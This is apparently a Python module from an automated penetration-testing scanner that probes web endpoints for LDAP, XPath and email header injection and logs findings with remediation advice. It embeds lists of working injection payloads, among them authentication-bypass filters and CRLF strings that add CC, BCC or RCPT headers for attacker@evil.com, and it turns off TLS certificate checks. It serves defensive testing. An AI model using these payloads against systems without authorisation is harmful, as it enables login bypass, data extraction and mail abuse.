"""
Jarwis AGI Pen Test - LDAP Injection Scanner
Detects LDAP injection vulnerabilities (A03:2021 - Injection)
Based on Web Hacking 101 techniques - adapted for 2025
"""

import asyncio
import logging
import re
from typing import Dict, List, Optional
from dataclasses import dataclass
from urllib.parse import urlparse, urljoin, urlencode
import aiohttp
import ssl

logger = logging.getLogger(__name__)


@dataclass
class ScanResult:
    id: str
    category: str
    severity: str
    title: str
    description: str
    url: str
    method: str
    parameter: str = ""
    evidence: str = ""
    remediation: str = ""
    cwe_id: str = ""
    poc: str = ""
    reasoning: str = ""
    request_data: str = ""
    response_data: str = ""


class LDAPInjectionScanner:
    """
    Scans for LDAP injection vulnerabilities
    OWASP A03:2021 - Injection
    
    Attack vectors:
    - Authentication bypass
    - Information disclosure
    - Attribute manipulation
    - Wildcard injection
    """
    
    # LDAP injection payloads
    LDAP_PAYLOADS = [
        # Authentication bypass
        '*',
        '*)(|(&',
        '*)(&',
        '*)(uid=*))(|(uid=*',
        'admin)(&)',
        '*)((|userPassword=*',
        'x*)(objectClass=*',
        
        # Boolean-based
        '*)(cn=*',
        '*)(uid=*',
        '*))(|(cn=*',
        
        # Wildcard attacks
        '*)(mail=*',
        '*)(telephoneNumber=*',
        '*)(description=*',
        
        # OR injection
        ')(|(password=*',
        ')(uid=*))(|(uid=*',
        
        # AND injection
        '*)(&(uid=admin)',
        '*)(&(objectClass=person)',
        
        # Null byte
        'admin%00',
        '*%00',
        
        # Special characters
        '*)(|)(cn=*',
        '*()|&',
        '*\\29',  # Escaped )
        '*\\28',  # Escaped (
    ]
    
    # Error patterns
    LDAP_ERROR_PATTERNS = [
        r'ldap[_\s]?error',
        r'invalid\s+dn\s+syntax',
        r'ldap\s+syntax\s+error',
        r'ldap\s+query\s+failed',
        r'ldap_search',
        r'ldap_bind',
        r'ldap_connect',
        r'invalid\s+search\s+filter',
        r'bad\s+search\s+filter',
        r'unrecognized\s+filter',
        r'filter\s+error',
        r'javax\.naming\.directory',
        r'com\.sun\.jndi',
        r'ldap://|ldaps://',
    ]
    
    def __init__(self, config: dict, context):
        self.config = config
        self.context = context
        self.results: List[ScanResult] = []
        self.rate_limit = config.get('rate_limit', 10)
        self.timeout = config.get('timeout', 15)
        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE
        
    async def scan(self) -> List[ScanResult]:
        """Main scan method"""
        logger.info("Starting LDAP Injection scan...")
        self.results = []
        
        base_url = self.config.get('target', {}).get('url', '')
        if not base_url:
            base_url = self.config.get('target_url', '')
        
        if not base_url:
            return self.results
        
        connector = aiohttp.TCPConnector(ssl=self.ssl_context, limit=10)
        
        async with aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=self.timeout)
        ) as session:
            
            # Test discovered endpoints
            endpoints = getattr(self.context, 'endpoints', [])
            
            for endpoint in endpoints[:20]:
                ep_url = endpoint.get('url', '') if isinstance(endpoint, dict) else str(endpoint)
                
                if ep_url and self._is_ldap_candidate(ep_url):
                    await self._test_ldap_injection(session, ep_url)
        
        logger.info(f"LDAP Injection scan complete. Found {len(self.results)} vulnerabilities")
        return self.results
    
    def _is_ldap_candidate(self, url: str) -> bool:
        """Check if URL is a good LDAP injection candidate"""
        ldap_keywords = [
            'login', 'user', 'auth', 'search', 'find', 'lookup',
            'directory', 'ldap', 'uid', 'cn', 'dn', 'query'
        ]
        return any(kw in url.lower() for kw in ldap_keywords)
    
    async def _test_ldap_injection(self, session: aiohttp.ClientSession, url: str):
        """Test for LDAP injection"""
        
        parsed = urlparse(url)
        params = dict(p.split('=') for p in parsed.query.split('&') if '=' in p) if parsed.query else {}
        
        # Add common LDAP parameters if none exist
        if not params:
            params = {'username': 'test', 'user': 'test', 'uid': 'test'}
        
        for param_name in list(params.keys()):
            for payload in self.LDAP_PAYLOADS:
                try:
                    await asyncio.sleep(1 / self.rate_limit)
                    
                    test_params = params.copy()
                    test_params[param_name] = payload
                    
                    # Test via GET
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params)}"
                    
                    async with session.get(test_url) as response:
                        body = await response.text()
                        
                        # Check for LDAP errors
                        for pattern in self.LDAP_ERROR_PATTERNS:
                            if re.search(pattern, body, re.IGNORECASE):
                                result = ScanResult(
                                    id=f"LDAP-INJ-{len(self.results)+1}",
                                    category="A03:2021 - Injection",
                                    severity="high",
                                    title="LDAP Injection Detected",
                                    description="LDAP error triggered indicating injection vulnerability.",
                                    url=url,
                                    method="GET",
                                    parameter=param_name,
                                    evidence=f"Error pattern: {pattern}",
                                    poc=f"Payload: {payload}",
                                    remediation="Use parameterized LDAP queries. Escape special characters.",
                                    cwe_id="CWE-90",
                                    reasoning=f"LDAP error in response with payload: {payload}"
                                )
                                self.results.append(result)
                                return
                        
                        # Check for wildcard success (unusual results)
                        if payload == '*' and len(body) > 5000:
                            result = ScanResult(
                                id=f"LDAP-INJ-{len(self.results)+1}",
                                category="A03:2021 - Injection",
                                severity="high",
                                title="LDAP Wildcard Injection",
                                description="Wildcard query returned excessive data.",
                                url=url,
                                method="GET",
                                parameter=param_name,
                                evidence=f"Response size: {len(body)} bytes",
                                poc=f"Payload: {payload}",
                                remediation="Validate input against whitelist. Limit result set.",
                                cwe_id="CWE-90",
                                reasoning="Wildcard injection returned more data than expected"
                            )
                            self.results.append(result)
                            return
                            
                except Exception as e:
                    logger.debug(f"LDAP injection test error: {e}")


class XPathInjectionScanner:
    """
    Scans for XPath injection vulnerabilities
    OWASP A03:2021 - Injection
    
    Attack vectors:
    - Authentication bypass
    - Data extraction
    - Boolean-based blind injection
    - Error-based injection
    """
    
    # XPath injection payloads
    XPATH_PAYLOADS = [
        # Authentication bypass
        "' or '1'='1",
        "' or ''='",
        "' or 1=1 or '1'='1",
        "x' or name()='username' or 'x'='y",
        
        # Boolean-based
        "1' and '1'='1",
        "1' and '1'='2",
        "' and contains(., 'a')",
        
        # Node traversal
        "//user[1]/password",
        "//user[position()=1]",
        "//*[contains(., 'admin')]",
        
        # Comment injection
        "admin' or '1'='1' --",
        
        # Function abuse
        "' or count(//user)>0 or '1'='1",
        "' or string-length(//user[1]/password)>0 or '1'='1",
        
        # Special characters
        "']|//|/['",
        "') or ('1'='1",
        
        # Null injection
        "' or ''='",
        
        # Namespace prefix
        "' or //*[local-name()='password'] or '1'='1",
    ]
    
    # Error patterns
    XPATH_ERROR_PATTERNS = [
        r'xpath\s+error',
        r'xpath\s+syntax',
        r'invalid\s+xpath',
        r'xmlquerysyntaxerror',
        r'xmldomexception',
        r'domexception',
        r'xpathexception',
        r'javax\.xml\.xpath',
        r'xml\.xpath',
        r'simplexml',
        r'domdocument',
        r'xmldocument',
        r'expression\s+must\s+evaluate\s+to\s+a\s+node',
        r'unknown\s+xpath\s+function',
    ]
    
    def __init__(self, config: dict, context):
        self.config = config
        self.context = context
        self.results: List[ScanResult] = []
        self.rate_limit = config.get('rate_limit', 10)
        self.timeout = config.get('timeout', 15)
        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE
        
    async def scan(self) -> List[ScanResult]:
        """Main scan method"""
        logger.info("Starting XPath Injection scan...")
        self.results = []
        
        base_url = self.config.get('target', {}).get('url', '')
        if not base_url:
            base_url = self.config.get('target_url', '')
        
        if not base_url:
            return self.results
        
        connector = aiohttp.TCPConnector(ssl=self.ssl_context, limit=10)
        
        async with aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=self.timeout)
        ) as session:
            
            # Test discovered endpoints
            endpoints = getattr(self.context, 'endpoints', [])
            
            for endpoint in endpoints[:20]:
                ep_url = endpoint.get('url', '') if isinstance(endpoint, dict) else str(endpoint)
                
                if ep_url:
                    await self._test_xpath_injection(session, ep_url)
        
        logger.info(f"XPath Injection scan complete. Found {len(self.results)} vulnerabilities")
        return self.results
    
    async def _test_xpath_injection(self, session: aiohttp.ClientSession, url: str):
        """Test for XPath injection"""
        
        parsed = urlparse(url)
        params = dict(p.split('=') for p in parsed.query.split('&') if '=' in p) if parsed.query else {}
        
        if not params:
            params = {'username': 'test', 'query': 'test', 'search': 'test'}
        
        for param_name in list(params.keys()):
            for payload in self.XPATH_PAYLOADS:
                try:
                    await asyncio.sleep(1 / self.rate_limit)
                    
                    test_params = params.copy()
                    test_params[param_name] = payload
                    
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params)}"
                    
                    async with session.get(test_url) as response:
                        body = await response.text()
                        
                        # Check for XPath errors
                        for pattern in self.XPATH_ERROR_PATTERNS:
                            if re.search(pattern, body, re.IGNORECASE):
                                result = ScanResult(
                                    id=f"XPATH-INJ-{len(self.results)+1}",
                                    category="A03:2021 - Injection",
                                    severity="high",
                                    title="XPath Injection Detected",
                                    description="XPath error indicates injection vulnerability.",
                                    url=url,
                                    method="GET",
                                    parameter=param_name,
                                    evidence=f"Error pattern: {pattern}",
                                    poc=f"Payload: {payload}",
                                    remediation="Use parameterized XPath. Escape user input.",
                                    cwe_id="CWE-643",
                                    reasoning=f"XPath error triggered with: {payload}"
                                )
                                self.results.append(result)
                                return
                            
                except Exception as e:
                    logger.debug(f"XPath injection test error: {e}")


class EmailInjectionScanner:
    """
    Scans for email header injection vulnerabilities
    OWASP A03:2021 - Injection
    
    Attack vectors:
    - Header injection (CC, BCC)
    - SMTP command injection
    - Template injection in emails
    """
    
    # Email injection payloads
    EMAIL_PAYLOADS = [
        # Header injection
        "test@test.com\r\nCC: attacker@evil.com",
        "test@test.com\nCC: attacker@evil.com",
        "test@test.com%0d%0aCC: attacker@evil.com",
        "test@test.com%0aCC: attacker@evil.com",
        "test@test.com\r\nBCC: attacker@evil.com",
        "test@test.com\r\nTo: attacker@evil.com",
        
        # Subject injection
        "test@test.com\r\nSubject: Injected",
        
        # Body injection
        "test@test.com\r\n\r\nInjected Body",
        
        # SMTP commands
        "test@test.com\r\n.\r\nMAIL FROM:<attacker@evil.com>",
        "test@test.com\r\nRCPT TO:<attacker@evil.com>",
        
        # Multiple recipients
        "test@test.com, attacker@evil.com",
        "test@test.com; attacker@evil.com",
    ]
    
    def __init__(self, config: dict, context):
        self.config = config
        self.context = context
        self.results: List[ScanResult] = []
        self.rate_limit = config.get('rate_limit', 10)
        self.timeout = config.get('timeout', 15)
        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE
        
    async def scan(self) -> List[ScanResult]:
        """Main scan method"""
        logger.info("Starting Email Injection scan...")
        self.results = []
        
        base_url = self.config.get('target', {}).get('url', '')
        if not base_url:
            base_url = self.config.get('target_url', '')
        
        if not base_url:
            return self.results
        
        connector = aiohttp.TCPConnector(ssl=self.ssl_context, limit=10)
        
        async with aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=self.timeout)
        ) as session:
            
            # Test discovered endpoints
            endpoints = getattr(self.context, 'endpoints', [])
            
            for endpoint in endpoints[:20]:
                ep_url = endpoint.get('url', '') if isinstance(endpoint, dict) else str(endpoint)
                
                if ep_url and self._is_email_form(ep_url):
                    await self._test_email_injection(session, ep_url)
        
        logger.info(f"Email Injection scan complete. Found {len(self.results)} vulnerabilities")
        return self.results
    
    def _is_email_form(self, url: str) -> bool:
        """Check if URL likely handles email"""
        email_keywords = [
            'contact', 'email', 'mail', 'subscribe', 'newsletter',
            'feedback', 'support', 'inquiry', 'message', 'form'
        ]
        return any(kw in url.lower() for kw in email_keywords)
    
    async def _test_email_injection(self, session: aiohttp.ClientSession, url: str):
        """Test for email header injection"""
        
        for payload in self.EMAIL_PAYLOADS:
            try:
                await asyncio.sleep(1 / self.rate_limit)
                
                # Test via POST
                form_data = {
                    'email': payload,
                    'to': payload,
                    'from': payload,
                    'message': 'Test message',
                    'subject': 'Test'
                }
                
                async with session.post(
                    url,
                    data=form_data,
                    headers={'Content-Type': 'application/x-www-form-urlencoded'}
                ) as response:
                    
                    body = await response.text()
                    
                    # Check for successful injection indicators
                    success_indicators = [
                        'email sent', 'message sent', 'thank you', 'success',
                        'delivered', 'submitted'
                    ]
                    
                    if any(ind in body.lower() for ind in success_indicators):
                        if '\r\n' in payload or '%0d%0a' in payload:
                            result = ScanResult(
                                id=f"EMAIL-INJ-{len(self.results)+1}",
                                category="A03:2021 - Injection",
                                severity="medium",
                                title="Potential Email Header Injection",
                                description="Email form may be vulnerable to header injection.",
                                url=url,
                                method="POST",
                                parameter="email",
                                evidence="CRLF payload accepted without validation",
                                poc=f"Payload: {payload}",
                                remediation="Strip CRLF from email inputs. Validate email format.",
                                cwe_id="CWE-93",
                                reasoning="Form accepted payload with CRLF sequences"
                            )
                            self.results.append(result)
                            return
                            
            except Exception as e:
                logger.debug(f"Email injection test error: {e}")
